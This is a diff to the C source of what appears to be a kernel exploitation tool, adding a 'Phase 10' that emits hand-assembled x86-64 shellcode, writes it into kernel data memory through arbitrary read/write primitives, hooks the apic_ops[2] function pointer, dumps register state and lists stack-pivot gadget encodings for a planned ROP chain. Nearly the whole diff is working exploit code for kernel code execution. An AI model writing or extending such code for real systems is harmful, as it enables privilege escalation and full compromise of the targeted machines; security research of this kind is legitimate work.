@@ -866,6 +866,168 @@ static int build_ring0_apic_writeback_shellcode(uint8_t *buf, int bufmax,
     return p;
 }
 
+/* ============================================================
+ * Register Capture Trampoline — Phase 10
+ *
+ * Captures the full register state at the moment the kernel
+ * calls apic_ops[2] (xapic_mode).  This tells us which
+ * registers point to controllable kdata memory, enabling
+ * targeted stack pivot selection.
+ *
+ * Layout:
+ *   - Trampoline shellcode at kdata cave (NX-cleared page)
+ *   - Register dump buffer at regbuf_dmap (DMAP-accessible)
+ *
+ * Register dump layout (uint64_t[20]):
+ *   [0x00] rax    [0x08] rbx    [0x10] rcx    [0x18] rdx
+ *   [0x20] rsi    [0x28] rdi    [0x30] rbp    [0x38] rsp (original)
+ *   [0x40] r8     [0x48] r9     [0x50] r10    [0x58] r11
+ *   [0x60] r12    [0x68] r13    [0x70] r14    [0x78] r15
+ *   [0x80] return_addr (call site in kernel)
+ *   [0x88] rflags
+ *   [0x90] capture_magic (0x52454743415000 = "REGCAP\0")
+ *   [0x98] xapic_retval (return value from original)
+ *
+ * The trampoline:
+ *   1. Saves all registers to the dump buffer
+ *   2. Calls through to the original xapic_mode
+ *   3. Saves the return value
+ *   4. Returns normally to the kernel
+ * ============================================================ */
+
+#define REGCAP_MAGIC 0x5245474341500001ULL  /* "REGCAP\0\x01" */
+#define REGCAP_BUF_SIZE  0xA0  /* 160 bytes = 20 uint64_t slots */
+
+static int build_regcap_trampoline(uint8_t *buf, int bufmax,
+                                    uint64_t regbuf_dmap,
+                                    uint64_t original_target) {
+    int p = 0;
+
+    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
+    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
+    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)
+
+    /*
+     * On entry: stack is [return_addr]
+     * We push rax and rbx as scratch registers.
+     * Stack after pushes: [rbx][rax][return_addr]
+     */
+
+    /* push rax */
+    EMIT(0x50);
+    /* push rbx */
+    EMIT(0x53);
+
+    /* movabs rbx, regbuf_dmap — load buffer address */
+    EMIT(0x48); EMIT(0xBB); EMIT_U64(regbuf_dmap);
+
+    /* Save original rax: mov rax, [rsp+8]; mov [rbx+0x00], rax */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x44); EMIT(0x24); EMIT(0x08);  /* mov rax,[rsp+8] */
+    EMIT(0x48); EMIT(0x89); EMIT(0x03);                           /* mov [rbx],rax */
+
+    /* Save original rbx: mov rax, [rsp]; mov [rbx+0x08], rax */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x04); EMIT(0x24);               /* mov rax,[rsp] */
+    EMIT(0x48); EMIT(0x89); EMIT(0x43); EMIT(0x08);               /* mov [rbx+8],rax */
+
+    /* Save rcx: mov [rbx+0x10], rcx */
+    EMIT(0x48); EMIT(0x89); EMIT(0x4B); EMIT(0x10);
+
+    /* Save rdx: mov [rbx+0x18], rdx */
+    EMIT(0x48); EMIT(0x89); EMIT(0x53); EMIT(0x18);
+
+    /* Save rsi: mov [rbx+0x20], rsi */
+    EMIT(0x48); EMIT(0x89); EMIT(0x73); EMIT(0x20);
+
+    /* Save rdi: mov [rbx+0x28], rdi */
+    EMIT(0x48); EMIT(0x89); EMIT(0x7B); EMIT(0x28);
+
+    /* Save rbp: mov [rbx+0x30], rbp */
+    EMIT(0x48); EMIT(0x89); EMIT(0x6B); EMIT(0x30);
+
+    /* Save original rsp: lea rax, [rsp+24]; mov [rbx+0x38], rax
+     * rsp+24 = original rsp before call pushed return addr,
+     * then we pushed rax and rbx (+16) */
+    EMIT(0x48); EMIT(0x8D); EMIT(0x44); EMIT(0x24); EMIT(0x18);  /* lea rax,[rsp+24] */
+    EMIT(0x48); EMIT(0x89); EMIT(0x43); EMIT(0x38);               /* mov [rbx+0x38],rax */
+
+    /* Save r8: mov [rbx+0x40], r8 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x43); EMIT(0x40);
+    /* Save r9: mov [rbx+0x48], r9 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x4B); EMIT(0x48);
+    /* Save r10: mov [rbx+0x50], r10 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x53); EMIT(0x50);
+    /* Save r11: mov [rbx+0x58], r11 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x5B); EMIT(0x58);
+    /* Save r12: mov [rbx+0x60], r12 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x63); EMIT(0x60);
+    /* Save r13: mov [rbx+0x68], r13 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x6B); EMIT(0x68);
+    /* Save r14: mov [rbx+0x70], r14 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x73); EMIT(0x70);
+    /* Save r15: mov [rbx+0x78], r15 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x7B); EMIT(0x78);
+
+    /* Save return address (call site): mov rax, [rsp+16]; mov [rbx+0x80], rax */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x44); EMIT(0x24); EMIT(0x10);  /* mov rax,[rsp+16] */
+    EMIT(0x48); EMIT(0x89); EMIT(0x83); EMIT_U32(0x80);           /* mov [rbx+0x80],rax */
+
+    /* Save rflags: pushfq; pop rax; mov [rbx+0x88], rax */
+    EMIT(0x9C);                                                     /* pushfq */
+    EMIT(0x58);                                                     /* pop rax */
+    EMIT(0x48); EMIT(0x89); EMIT(0x83); EMIT_U32(0x88);           /* mov [rbx+0x88],rax */
+
+    /* Write capture magic: movabs rax, REGCAP_MAGIC; mov [rbx+0x90], rax */
+    EMIT(0x48); EMIT(0xB8); EMIT_U64(REGCAP_MAGIC);
+    EMIT(0x48); EMIT(0x89); EMIT(0x83); EMIT_U32(0x90);
+
+    /* Restore rbx, rax */
+    EMIT(0x5B);  /* pop rbx */
+    EMIT(0x58);  /* pop rax */
+
+    /* Stack is now: [return_addr] — same as entry.
+     * Call through to original xapic_mode and capture its return value.
+     *
+     * We use: push original_addr; call [rsp]; add rsp,8
+     * This calls the original, then we save retval and return.
+     *
+     * Actually simpler: save rax, call, save retval to buf, restore, ret.
+     * But we don't have rbx anymore (restored).
+     *
+     * Approach: call original via register, save retval via DMAP.
+     */
+
+    /* Save return address — we'll jump back to caller ourselves */
+    /* pop rcx — grab return address (caller-saved, OK to clobber) */
+    EMIT(0x59);
+
+    /* push rcx — save it for later */
+    EMIT(0x51);
+
+    /* Call original xapic_mode:
+     * movabs rax, original_target; call rax */
+    EMIT(0x48); EMIT(0xB8); EMIT_U64(original_target);
+    EMIT(0xFF); EMIT(0xD0);  /* call rax */
+
+    /* rax now has xapic_mode return value.
+     * Save it to regbuf[0x98].
+     * Use rcx as scratch (it's caller-saved, and we saved it on stack). */
+    EMIT(0x51);  /* push rcx (save our return addr copy) */
+    EMIT(0x48); EMIT(0xB9); EMIT_U64(regbuf_dmap + 0x98);  /* movabs rcx, &retval_slot */
+    EMIT(0x48); EMIT(0x89); EMIT(0x01);  /* mov [rcx], rax */
+    EMIT(0x59);  /* pop rcx */
+
+    /* Return to original caller: pop rcx has our return addr, push+ret */
+    EMIT(0x59);  /* pop rcx — our saved return addr */
+    EMIT(0x51);  /* push rcx — put it back as return target */
+    EMIT(0xC3);  /* ret */
+
+    #undef EMIT
+    #undef EMIT_U32
+    #undef EMIT_U64
+
+    return p;
+}
+
 static void campaign_kmod_kldload(void) {
     printf("\n=============================================\n");
     printf("  Campaign 7: Kernel Module (kldload)\n");
@@ -5497,6 +5659,229 @@ static void campaign_flatz_setup(void) {
             fflush(stdout);
         } else {
             printf("[-] Phase 9 skipped: sysent VA→PA failed or too few apic_ops.\n\n");
+            fflush(stdout);
+        }
+
+        /*
+         * ─── Phase 10: Register State Capture at apic_ops[2] Call Site ───
+         *
+         * Before we can choose a stack pivot gadget, we need to know the
+         * register state at the moment the kernel calls apic_ops[2].
+         * If any register points to controllable kdata, we can use a
+         * matching pivot type (xchg rsp, R; leave; ret; etc.).
+         *
+         * Approach:
+         *   1. Build a register-capturing trampoline in kdata cave
+         *   2. Hook apic_ops[2] → trampoline (kdata is executable normally)
+         *   3. Wait for kernel to call it (LAPIC code calls xapic_mode)
+         *   4. Read register dump from buffer
+         *   5. Restore apic_ops[2] to original
+         *   6. Analyze which registers point to kdata
+         */
+        printf("\n=============================================\n");
+        printf("  Phase 10: Register State Capture\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        #define P10_TRAMP_OFFSET  0x180   /* trampoline code in kdata_base page */
+        #define P10_REGBUF_OFFSET 0x280   /* register dump buffer */
+
+        uint64_t p10_kdata_pa = va_to_pa_quiet(g_kdata_base);
+
+        if (p10_kdata_pa && n_ops >= 3) {
+            uint64_t p10_tramp_kva  = g_kdata_base + P10_TRAMP_OFFSET;
+            uint64_t p10_tramp_dmap = g_dmap_base + p10_kdata_pa + P10_TRAMP_OFFSET;
+            uint64_t p10_regbuf_dmap = g_dmap_base + p10_kdata_pa + P10_REGBUF_OFFSET;
+
+            /* Zero the register buffer first */
+            uint8_t p10_zeros[REGCAP_BUF_SIZE];
+            memset(p10_zeros, 0, sizeof(p10_zeros));
+            kernel_copyin(p10_zeros, p10_regbuf_dmap, REGCAP_BUF_SIZE);
+
+            /* Build trampoline */
+            uint8_t p10_sc[256];
+            int p10_sc_len = build_regcap_trampoline(p10_sc, sizeof(p10_sc),
+                                                      p10_regbuf_dmap,
+                                                      ops[2]);  /* original xapic_mode */
+
+            printf("[*] Register capture trampoline: %d bytes at kdata+0x%x\n",
+                   p10_sc_len, P10_TRAMP_OFFSET);
+            printf("[*] Register buffer at kdata+0x%x (DMAP: 0x%lx)\n",
+                   P10_REGBUF_OFFSET, (unsigned long)p10_regbuf_dmap);
+            printf("[*] Original xapic_mode: 0x%016lx\n",
+                   (unsigned long)ops[2]);
+            fflush(stdout);
+
+            /* Save current trampoline area (restore later) */
+            uint8_t p10_backup[256];
+            kernel_copyout(p10_tramp_dmap, p10_backup, (size_t)p10_sc_len);
+
+            /* Write trampoline shellcode to kdata cave */
+            kernel_copyin(p10_sc, p10_tramp_dmap, (size_t)p10_sc_len);
+
+            /* Verify write */
+            uint8_t p10_verify[16];
+            kernel_copyout(p10_tramp_dmap, p10_verify, 16);
+            if (memcmp(p10_sc, p10_verify, 16) != 0) {
+                printf("[-] Trampoline write verification FAILED!\n");
+                fflush(stdout);
+            } else {
+                printf("[+] Trampoline written and verified.\n");
+
+                /* Hook apic_ops[2] → register capture trampoline */
+                uint64_t p10_apic_ops_pa = va_to_pa_quiet(g_kdata_base + 0x1656b0ULL + 2 * 8);
+                if (p10_apic_ops_pa) {
+                    uint64_t p10_orig_ops2 = 0;
+                    kernel_copyout(g_dmap_base + p10_apic_ops_pa, &p10_orig_ops2, 8);
+
+                    printf("[*] Hooking apic_ops[2]: 0x%lx → 0x%lx (trampoline)\n",
+                           (unsigned long)p10_orig_ops2,
+                           (unsigned long)p10_tramp_kva);
+                    fflush(stdout);
+
+                    /* Install hook */
+                    kernel_copyin(&p10_tramp_kva, g_dmap_base + p10_apic_ops_pa, 8);
+
+                    /* Wait for kernel to call apic_ops[2].
+                     * The LAPIC code calls xapic_mode periodically.
+                     * Check every 100ms for up to 5 seconds. */
+                    printf("[*] Waiting for kernel to call xapic_mode...\n");
+                    fflush(stdout);
+
+                    int p10_captured = 0;
+                    for (int wait = 0; wait < 50; wait++) {
+                        usleep(100000);  /* 100ms */
+
+                        uint64_t p10_magic_check = 0;
+                        kernel_copyout(p10_regbuf_dmap + 0x90, &p10_magic_check, 8);
+                        if (p10_magic_check == REGCAP_MAGIC) {
+                            p10_captured = 1;
+                            printf("[+] Capture triggered after %d ms!\n", (wait + 1) * 100);
+                            break;
+                        }
+                    }
+
+                    /* Restore apic_ops[2] immediately */
+                    kernel_copyin(&p10_orig_ops2, g_dmap_base + p10_apic_ops_pa, 8);
+                    printf("[*] apic_ops[2] restored to original.\n");
+                    fflush(stdout);
+
+                    if (p10_captured) {
+                        /* Read register dump */
+                        uint64_t regs[20];
+                        kernel_copyout(p10_regbuf_dmap, regs, sizeof(regs));
+
+                        printf("\n[+] ═══════════════════════════════════════════\n");
+                        printf("[+]  REGISTER STATE AT apic_ops[2] CALL SITE\n");
+                        printf("[+] ═══════════════════════════════════════════\n\n");
+
+                        const char *regnames[] = {
+                            "rax", "rbx", "rcx", "rdx",
+                            "rsi", "rdi", "rbp", "rsp",
+                            "r8 ", "r9 ", "r10", "r11",
+                            "r12", "r13", "r14", "r15",
+                            "ret_addr", "rflags", "magic", "xapic_ret"
+                        };
+                        for (int i = 0; i < 20; i++) {
+                            printf("    %-10s = 0x%016lx", regnames[i],
+                                   (unsigned long)regs[i]);
+
+                            /* Annotate registers that point to interesting regions */
+                            uint64_t v = regs[i];
+                            if (v >= g_kdata_base && v < g_kdata_base + 0x8000000)
+                                printf("  ← KDATA (+0x%lx)",
+                                       (unsigned long)(v - g_kdata_base));
+                            else if (v >= g_ktext_base && v < g_ktext_base + 0xC00000)
+                                printf("  ← KTEXT (+0x%lx)",
+                                       (unsigned long)(v - g_ktext_base));
+                            else if (g_dmap_base && v >= g_dmap_base &&
+                                     v < g_dmap_base + 0x800000000ULL)
+                                printf("  ← DMAP");
+                            printf("\n");
+                        }
+
+                        /* Analyze for pivot viability */
+                        printf("\n[*] ═══ PIVOT VIABILITY ANALYSIS ═══\n\n");
+
+                        /* Check each register for kdata (controllable) pointers */
+                        int pivot_candidates = 0;
+                        struct { int reg_idx; const char *pivot_type; } pivots[16];
+
+                        for (int i = 0; i < 16; i++) {
+                            uint64_t v = regs[i];
+                            if (v >= g_kdata_base && v < g_kdata_base + 0x8000000) {
+                                const char *ptype = "unknown";
+                                switch (i) {
+                                    case 0: ptype = "xchg rsp, rax (48 94 c3)"; break;
+                                    case 1: ptype = "xchg rsp, rbx (48 87 e3 c3)"; break;
+                                    case 2: ptype = "xchg rsp, rcx (48 87 e1 c3)"; break;
+                                    case 3: ptype = "xchg rsp, rdx (48 87 e2 c3)"; break;
+                                    case 4: ptype = "xchg rsp, rsi (48 87 e6 c3)"; break;
+                                    case 5: ptype = "xchg rsp, rdi (48 87 e7 c3)"; break;
+                                    case 6: ptype = "leave; ret (c9 c3) — sets rsp=rbp"; break;
+                                    case 8:  ptype = "xchg rsp, r8  (49 87 e0 c3)"; break;
+                                    case 9:  ptype = "xchg rsp, r9  (49 87 e1 c3)"; break;
+                                    case 10: ptype = "xchg rsp, r10 (49 87 e2 c3)"; break;
+                                    case 11: ptype = "xchg rsp, r11 (49 87 e3 c3)"; break;
+                                    case 12: ptype = "xchg rsp, r12 (49 87 e4 c3)"; break;
+                                    case 13: ptype = "xchg rsp, r13 (49 87 e5 c3)"; break;
+                                    case 14: ptype = "xchg rsp, r14 (49 87 e6 c3)"; break;
+                                    case 15: ptype = "xchg rsp, r15 (49 87 e7 c3)"; break;
+                                }
+                                if (pivot_candidates < 16) {
+                                    pivots[pivot_candidates].reg_idx = i;
+                                    pivots[pivot_candidates].pivot_type = ptype;
+                                    pivot_candidates++;
+                                }
+                                printf("    [CANDIDATE] %s → %s\n", regnames[i], ptype);
+                                printf("                Value 0x%lx = kdata+0x%lx\n",
+                                       (unsigned long)v,
+                                       (unsigned long)(v - g_kdata_base));
+                                printf("                We can pre-fill kdata at that offset "
+                                       "with ROP chain!\n\n");
+                            }
+                        }
+
+                        /* Also check return address — tells us the exact call site */
+                        printf("    Call site (return addr): 0x%lx",
+                               (unsigned long)regs[16]);
+                        if (regs[16] >= g_ktext_base &&
+                            regs[16] < g_ktext_base + 0xC00000)
+                            printf(" (ktext+0x%lx)",
+                                   (unsigned long)(regs[16] - g_ktext_base));
+                        printf("\n");
+                        printf("    xapic_mode returned: %ld (0x%lx)\n",
+                               (long)regs[19], (unsigned long)regs[19]);
+
+                        if (pivot_candidates == 0) {
+                            printf("\n    [!] No registers point to kdata at call time.\n");
+                            printf("    Need alternative approach:\n");
+                            printf("    - Pre-load a register via kdata write before call\n");
+                            printf("    - Use a multi-gadget chain (load + pivot)\n");
+                            printf("    - Use pop rsp; ret gadget with controlled stack data\n");
+                        } else {
+                            printf("\n    [+] %d pivot candidate(s) found!\n",
+                                   pivot_candidates);
+                            printf("    Next: find matching pivot gadget in ktext.\n");
+                        }
+                        printf("\n");
+                        fflush(stdout);
+                    } else {
+                        printf("[-] No capture after 5 seconds. xapic_mode may not be "
+                               "called during normal operation.\n");
+                        printf("    Try triggering LAPIC activity (e.g., timer interrupt).\n");
+                        fflush(stdout);
+                    }
+                } else {
+                    printf("[-] Cannot resolve apic_ops[2] PA for hook.\n");
+                    fflush(stdout);
+                }
+            }
+
+            /* Restore trampoline area */
+            kernel_copyin(p10_backup, p10_tramp_dmap, (size_t)p10_sc_len);
+        } else {
+            printf("[-] Phase 10 skipped: kdata_base PA unavailable.\n");
             fflush(stdout);
         }
 
